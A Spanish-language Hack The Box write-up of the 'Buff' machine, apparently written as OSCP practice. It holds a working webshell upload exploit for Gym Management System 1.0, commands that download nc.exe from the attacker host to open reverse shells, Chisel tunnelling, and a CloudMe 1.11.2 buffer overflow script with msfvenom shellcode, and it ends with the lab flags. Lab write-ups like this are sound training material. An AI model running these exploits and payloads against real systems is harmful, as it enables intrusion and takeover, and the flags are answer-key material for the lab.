---
tags:
  - env/windows
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/263
dificultad: Fácil
ip: 10.10.10.198
os: Windows
relacionados:
  - "[[Remote Code Execution|RCE]]"
  - "[[Gym Management System Exploitation]]"
  - "[[CloudMe Exploitation]]"
  - "[[Buffer Overflow]]"
  - "[[Unauthenticated File Upload]]"
  - "[[Port Forwarding]]"
---
# HackTheBox - Buff

## Reconocimiento

### Escaneo de Puertos

Inicié mi reconocimiento con un escaneo de todos los puertos TCP en la máquina objetivo utilizando `nmap`. Mi objetivo era identificar rápidamente todos los servicios expuestos.
```Bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG 01_Reconnaissance/tcpports
```

Una vez identificados los puertos abiertos, realicé un escaneo más detallado sobre ellos para enumerar las versiones de los servicios y ejecutar scripts de reconocimiento básicos.
```Bash
nmap -sCV -p7680,8080 $(cat ip) --version-all --script-timeout 30s -oN 01_Reconnaissance/sCV
```

El resultado más interesante fue el puerto **8080**, donde encontré un servidor web Apache ejecutando PHP 7.4.6. Al visitar `http://10.10.10.198:8080` en mi navegador, me topé con la página de un gimnasio.

Navegando por el sitio, descubrí la página `/contact`, la cual revelaba la tecnología subyacente: **Gym Management System 1.0**.


___

## Análisis de vulnerabilidades

### Gym Management System 1.0 - Unauthenticated File Upload

Con la versión del software en mi poder, realicé una búsqueda de vulnerabilidades públicas. Rápidamente encontré que **Gym Management System 1.0** es vulnerable a una subida de archivos sin autenticación que puede conducir a la ejecución remota de código (RCE).

Decidí descargar el código fuente de la aplicación para analizar la vulnerabilidad por mi cuenta. El fallo se encuentra en el archivo `upload.php`.
```PHP
<?php
// <SNIP>
$user = $_GET['id']; // El nombre de usuario se toma directamente de un parámetro GET 'id'.
$allowedExts = array("jpg", "jpeg", "gif", "png","JPG");
$extension = @end(explode(".", $_FILES["file"]["name"]));
if(isset($_POST['pupload'])){
    if ((($_FILES["file"]["type"] == "image/png")
    // <SNIP>
    // La validación del tipo de archivo es débil.
    move_uploaded_file($_FILES["file"]["tmp_name"],
    "upload/". $user.".".$ext); // El archivo se guarda concatenando el 'id' y la extensión.
    $url=$user.".".$ext;
// <SNIP>
?>
```

>[!VULNERABILITY] Título: Carga de Archivos Sin Restricción
>
El script upload.php presenta dos fallos críticos:
>
>1. **Falta de Autenticación:** No verifica si el usuario que sube el archivo ha iniciado sesión, permitiendo que cualquier persona interactúe con esta funcionalidad.
    >
>2. **Validación de Archivo Inadecuada:** Aunque verifica la extensión y el tipo de contenido, esta validación es superficial. Se puede eludir utilizando un nombre de archivo con doble extensión (ej. `shell.php.png`) y añadiendo los _magic bytes_ de un archivo de imagen al principio de nuestro payload malicioso. Además, el nombre del archivo final se construye usando el parámetro `id` de la URL, lo que me da control total sobre el nombre del archivo subido en el servidor.
    

___

## Explotación de vulnerabilidades

### Explotación de File Upload a RCE

Para explotar esta vulnerabilidad, creé un script en Python que automatiza el proceso de subida de un webshell PHP. El script añade los _magic bytes_ de un archivo PNG al principio de mi payload para pasar la validación del tipo de archivo.

Mi payload es una simple webshell en PHP que ejecuta comandos a través del parámetro `cmd` en una petición GET.
```Python
#!/usr/bin/env python3
import requests

def main():
    # El parámetro 'id' en la URL definirá el nombre de nuestro archivo como 'test.php'
    url = "http://10.10.10.198:8080/upload.php?id=test.php"
    s = requests.Session()
    s.get(url, verify=False)
    
    # Preparamos el payload con los magic bytes de PNG
    png_magic_bytes = b'\x89\x50\x4e\x47\x0d\x0a\x1a'
    php_payload = b'<?php echo shell_exec($_GET["cmd"]); ?>'
    
    files = {
        'file': (
            'test.php.png', # Nombre con doble extensión para el bypass
            png_magic_bytes + b'\n' + php_payload,
            'image/png',
            {'Content-Disposition': 'form-data'}
        )
    }
    
    data = {'pupload': 'upload'}
    
    r = s.post(url=url, files=files, data=data, verify=False)
    print("¡Webshell subido con éxito!")

if __name__ == "__main__":
    main()
```

Ejecuté el script y, una vez subido el archivo, verifiqué que podía ejecutar comandos visitando `http://10.10.10.198:8080/upload/test.php`.

### Obtención de Reverse Shell

Para obtener una shell interactiva, decidí usar mi webshell para descargar y ejecutar `nc.exe`. Primero, levanté un servidor HTTP local para alojar el binario de Netcat.
```Bash
# En mi máquina de atacante
python3 -m http.server 80
```

Luego, puse un listener de Netcat a la espera de la conexión entrante.
```Bash
# En mi máquina de atacante
nc -lvnp 443
```

Finalmente, utilicé la webshell para descargar `nc.exe` en el sistema de la víctima y luego ejecutarlo para que se conectara a mi listener, proporcionándome una reverse shell.
```Bash
# Descargar nc.exe en la máquina víctima
curl "http://10.10.10.198:8080/upload/test.php?cmd=powershell%20Invoke-WebRequest%20-Uri%20http%3A%2F%2F10.10.14.2%2Fnc.exe%20-Outfile%20c%3A%5Cusers%5Cpublic%5Cnc.exe"

# Ejecutar nc.exe para obtener la reverse shell
curl "http://10.10.10.198:8080/upload/test.php?cmd=c%3A%5Cusers%5Cpublic%5Cnc.exe%2010.10.14.2%20443%20-e%20cmd.exe"
```

Con esto, logré obtener una shell en el sistema como el usuario `shaun`.


___

## Escalada de privilegios

### Reconocimiento Interno

Una vez dentro, comencé a enumerar el sistema. En el directorio `C:\Users\shaun\Downloads`, encontré un instalador llamado `CloudMe_1112.exe`. Para entender su funcionamiento sin afectar el sistema objetivo, descargué este archivo a mi máquina y lo instalé en una máquina virtual de Windows.

Al ejecutar la aplicación, descubrí que abría un servicio en el puerto **8888**. De vuelta en la shell de la víctima, confirmé con `netstat` que este mismo servicio estaba activo, pero escuchando únicamente en la interfaz de loopback (`127.0.0.1`).
```PowerShell
netstat -an | findstr "LISTENING"
```

Esto significaba que el servicio no era accesible desde el exterior, solo desde la propia máquina.

### Análisis de CloudMe 1.11.2 - Buffer Overflow

Busqué en línea "CloudMe 1.11.2 exploit" y encontré una entrada en Exploit-DB que describía una vulnerabilidad de **Buffer Overflow**.

>[!VULNERABILITY] Título: Buffer Overflow en CloudMe 1.11.2
>
La versión 1.11.2 del software CloudMe es vulnerable a un desbordamiento de búfer clásico. Al enviarle una cadena de caracteres excesivamente larga, es posible sobrescribir el puntero de instrucción (EIP) en la pila y redirigir el flujo de ejecución del programa a un shellcode controlado por mí.

### Port Forwarding con Chisel

Para explotar el servicio que corría localmente en la máquina víctima, necesitaba una forma de acceder al puerto 8888 desde mi máquina de atacante. Para esto, utilicé **Chisel** para crear un túnel reverso.

Primero, levanté un servidor de Chisel en mi máquina, escuchando en el puerto 9999.
```Bash
# En mi máquina de atacante
./chisel server -p 9999 --reverse
```

Luego, subí el cliente de Chisel a la máquina víctima y lo ejecuté para que se conectara a mi servidor, redirigiendo su puerto local 8888 al puerto 8888 de mi máquina.
```PowerShell
# En la máquina víctima
chisel.exe client 10.10.14.17:9999 R:8888:127.0.0.1:8888
```

[!note] El _port forwarding_ reverso (`R:`) es crucial aquí. Le indica al cliente de Chisel que exponga un puerto remoto en el servidor. Cualquier conexión que yo haga a `localhost:8888` en mi máquina será redirigida a través del túnel hasta `127.0.0.1:8888` en la máquina víctima.

### Explotación del Buffer Overflow

Con el túnel establecido, el siguiente paso fue generar un shellcode para obtener una reverse shell como administrador. Utilicé `msfvenom`, asegurándome de evitar los _bad characters_ (`\x00`, `\x0d`, `\x0a`) que podrían romper el exploit.
```Bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.17 LPORT=443 EXITFUNC=thread -b "\x00\x0d\x0a" -f python
```

Pegué el shellcode generado en el script de exploit de Python. Este script construye el payload con el padding necesario, la dirección para sobreescribir el EIP, una sección de NOPs y finalmente mi shellcode.

```Python
import socket
import sys

target = "127.0.0.1" # Apunto al puerto local forwardeado

# Estructura del payload del Buffer Overflow
padding1 = b"\x90" * 1052
EIP = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS = b"\x90" * 30

# Shellcode generado con msfvenom
payload = b"\xba\xad\x1e\x7c\x02\xdb\xcf\xd9\x74\x24\xf4\x5e\x33"
payload += b"\xc9\xb1\x31\x83\xc6\x04\x31\x56\x0f\x03\x56\xa2\xfc"
# <SNIP>
payload += b"\x7a\xd8\x1f\x6f\x1d\x4a\xc3\x5e\xb8\xea\x66\x9f"

overrun = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))
buf = padding1 + EIP + NOPS + payload + overrun

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, 8888))
    s.send(buf)
except Exception as e:
    print(e)
```

Preparé un nuevo listener de Netcat en el puerto 4444 y ejecuté el script.
```Bash
nc -lvnp 443
python3 exploit.py
```

La explotación fue exitosa y recibí una shell en mi listener con privilegios de `nt authority\system`, lo que me permitió leer la flag de root.


---

## Bandera(s)

> [!flag] `flag{user}`
> d5825b21d081fc5ed4264482618816f2
^bandera-user

> [!flag] `flag{root}`
> 3b5b91a3b40f83d219d46816231854c4
^bandera-root
